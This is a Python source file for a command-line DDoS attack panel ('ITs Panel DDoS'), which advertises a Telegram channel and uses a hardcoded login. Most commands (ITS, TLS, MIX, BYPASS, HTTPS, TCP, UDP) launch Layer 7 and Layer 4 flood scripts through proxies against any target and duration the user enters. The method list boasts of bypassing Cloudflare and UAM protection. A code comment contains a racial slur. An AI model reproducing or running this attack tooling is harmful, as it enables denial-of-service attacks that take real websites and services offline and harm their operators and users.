import socket
import os
import requests
import random
import getpass
import time
import sys
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def logo():
	clear()
	sys.stdout.write(f" ITs --> User: [3/10] | Star: [Uncountable] | Method: [9] | ITs By Lintar ")
	print("""
    ██▓▄▄▄█████▓  ██████
    ▓██▒▓  ██▒ ▓▒▒██    ▒     Telegram Channel: Https://t.me/ItsApi
    ▒██▒▒ ▓██░ ▒░░ ▓██▄      ITs Panel DDoS By Lintar
    ░██░░ ▓██▓ ░   ▒   ██▒    ITs Staff By Kaizo
    ░██░  ▒██▒ ░ ▒██████▒▒
    ░▓    ▒ ░░   ▒ ▒▓▒ ▒ ░
     ▒ ░    ░    ░ ░▒  ░ ░
     ▒ ░  ░      ░  ░  ░  
     ░                 ░  
                      
""")


def methods():
	clear()
	print("""
    ██▓▄▄▄█████▓  ██████
    ▓██▒▓  ██▒ ▓▒▒██    ▒     Telegram Channel: Https://t.me/ItsApi
    ▒██▒▒ ▓██░ ▒░░ ▓██▄      ITs Panel DDoS By Lintar
    ░██░░ ▓██▓ ░   ▒   ██▒    ITs Staff By Kaizo
    ░██░  ▒██▒ ░ ▒██████▒▒
    ░▓    ▒ ░░   ▒ ▒▓▒ ▒ ░
     ▒ ░    ░    ░ ░▒  ░ ░
     ▒ ░  ░      ░  ░  ░  
     ░                 ░  
                      
 ITS: Great for sites with little protection
 TLS: Tls The large RPS method is good for regular sites
 MIX: A Mix of All Methods 
 TCP: TCP Method Layer4
 UDP: UDP Method Layer 4
 REQ: You can customize Rps and threads 
 BOT: Wear it to Show power
 HTTPS: Method with large rps bypass cf, Uam, HTTP DDoS
 BYPASS: Bypass site Uam, with big rps
 PROXY: Proxy Scrape
 PAPING: Pa Ping Site
""")

def main():
    logo()
    while(True):
        cnc = input('''ITs/@Root\n –> ''')
        if cnc == "Methods" or cnc == "methods" or cnc == "METHOD" or cnc == "METHODS":
            methods()
        elif cnc == "Clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
			
        elif "ITS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && screen -dm node ITS.js {host} {time} 35 10 proxy.txt')
                clear()
                print(f'''
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒         
▒██▒▒ ▓██░ ▒░░ ▓██▄           
░██░░ ▓██▓ ░   ▒   ██▒          
░██░  ▒██▒ ░ ▒██████▒▒
Type [CLS] To Clear Terminal
Method: ITS
Target: {host}
Time: {time}
Thread: 10
Rps: 35
''')
            except IndexError:
                print('Usage: ITS Target Time');
                print('Example: ITS https://example.com 120');
                
        elif "TLS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && screen -dm node TLS.js {host} {time} 35 10 proxy.txt')
                clear()
                print(f'''
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒         
▒██▒▒ ▓██░ ▒░░ ▓██▄           
░██░░ ▓██▓ ░   ▒   ██▒          
░██░  ▒██▒ ░ ▒██████▒▒
Type [CLS] To Clear Terminal
Method: 
Target: {host}
Time: {time}
Thread: 10
Rps: 35
''')
            except IndexError:
                print('Usage: TLS Target Time');
                print('Example: TLS https://example.com 120');
                
        elif "BOT" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && screen -dm node TLS.js {host} {time} 35 10 proxy.txt')
                clear()
                print(f'''
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒         
▒██▒▒ ▓██░ ▒░░ ▓██▄           
░██░░ ▓██▓ ░   ▒   ██▒          
░██░  ▒██▒ ░ ▒██████▒▒
Type [CLS] To Clear Terminal
Method: BOT
Target: {host}
Time: {time}
Thread: 10
Rps: 35
''')
            except IndexError:
                print('Usage: BOT Target Time');
                print('Example: BOT https://example.com 120');
                
        elif "REQ" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'cd L7 && screen -dm node TLS.js {host} {time} {rps} {thread} proxy.txt')
                clear()
                print(f'''
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒         
▒██▒▒ ▓██░ ▒░░ ▓██▄           
░██░░ ▓██▓ ░   ▒   ██▒          
░██░  ▒██▒ ░ ▒██████▒▒
Type [CLS] To Clear Terminal
Method: REQ
Target: {host}
Time: {time}
Thread: {thread}
Rps: {rps}
''')
            except IndexError:
                print('Usage: REQ Target Time Rps Thread');
                print('Minimum Rps 35 to 65 is good for bypass');
                print('Minimum Thread 2 to 11 is good for bypass');
                print('Example: REQ  https://example.com 120 35 10');   
                
        elif "MIX" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && screen -dm node HTTPS.js {host} {time} 35 10 proxy.txt')
                os.system(f'cd L7 && screen -dm node HTTPS-2.js {host} {time} 35 10 proxy.txt')
                os.system(f'cd L7 && screen -dm node BYPASS.js {host} {time} 35 10 proxy.txt')
                os.system(f'cd L7 && screen -dm node ITS.js {host} {time} 35 10 proxy.txt')
                os.system(f'cd L7 && screen -dm node TLS.js {host} {time} 35 10 proxy.txt')
                clear()
                print(f'''
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒         
▒██▒▒ ▓██░ ▒░░ ▓██▄           
░██░░ ▓██▓ ░   ▒   ██▒          
░██░  ▒██▒ ░ ▒██████▒▒
Type [CLS] To Clear Terminal
Method: MIX
Target: {host}
Time: {time}
Thread: 10
Rps: 35
''')
            except IndexError:
                print('Usage: MIX Target Time');
                print('Example: MIX https://example.com 120');
                
        elif "BYPASS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && screen -dm node BYPASS.js {host} {time} 35 10 proxy.txt')
                clear()
                print(f'''
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒         
▒██▒▒ ▓██░ ▒░░ ▓██▄           
░██░░ ▓██▓ ░   ▒   ██▒          
░██░  ▒██▒ ░ ▒██████▒▒
Type [CLS] To Clear Terminal
Method: BYPASS
Target: {host}
Time: {time}
Thread: 10
Rps: 35
''')
            except IndexError:
                print('Usage: BYPASS Target Time');
                print('Example: BYPASS https://example.com 120');

        elif "HTTPS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && screen -dm node HTTPS.js {host} {time} 35 10 proxy.txt')
                clear()
                print(f'''
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒         
▒██▒▒ ▓██░ ▒░░ ▓██▄           
░██░░ ▓██▓ ░   ▒   ██▒          
░██░  ▒██▒ ░ ▒██████▒▒
Type [CLS] To Clear Terminal
Method: HTTPS
Target: {host}
Time: {time}
Thread: 10
Rps: 35
''')
            except IndexError:
                print('Usage: HTTPS Target Time');
                print('Example: HTTPS https://example.com 120');

        elif "TCP" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                port = cnc.split()[3]
                os.system(f'cd L4 && screen -dm node BYPASS.js {host} {time} {port}')
                clear()
                print(f'''
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒         
▒██▒▒ ▓██░ ▒░░ ▓██▄           
░██░░ ▓██▓ ░   ▒   ██▒          
░██░  ▒██▒ ░ ▒██████▒▒
Type [CLS] To Clear Terminal
Method: TCP
Target: {host}
Time: {time}
Port: {port}
''')
            except IndexError:
                print('Usage: TCP Target Time Port');
                print('Example: TCP https://example.com 120 80');

        elif "UDP" in cnc:
            try: 
                host = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'cd L4 && screen -dm python3 UDP.py {host} {port} {time} 50 10')
                clear()
                print(f'''
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒         
▒██▒▒ ▓██░ ▒░░ ▓██▄           
░██░░ ▓██▓ ░   ▒   ██▒          
░██░  ▒██▒ ░ ▒██████▒▒
Type [CLS] To Clear Terminal
Method: UDP
Target: {host}
Time: {time}
Port: {port}
Threads: 10
Packet_Size: 50
''')
            except IndexError:
                print('Usage: UDP Target Port Time');
                print('Example: UDP https://example.com 120 80');

        elif "PROXY" in cnc:
            try: 
                os.system(f'cd L7 && python3 Scrape.py')
            except IndexError:
                print('Usage: PROXY');
                print('Example: PROXY');

        elif "PAPING" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'python3 paping.py {ip} {port}')
            except IndexError:
                print('Usage: paping <ip> <port> <time>')
                print('Example: paping 1.1.1.1 443 120')
                
                
#only niggs dont understand
        elif "HELP" in cnc:
            print(f'''         
» Methods : To show methods 
» Clear: To clear all messages
            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
                

# LOG-IN
def login():
    clear()
    user = "Root"
    passwd = "1"
    username = input("Username: ")
    password = getpass.getpass(prompt='Password: ')
    if username != user or password != passwd:
        print("")
        print("Sorry, the password/username you entered is wrong!!!")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Welcome to ITs DDoS Panel!!!...")
        time.sleep(0.9)
        print("Wellcome To PanelDdos")
        time.sleep(0.9)
        main()

login()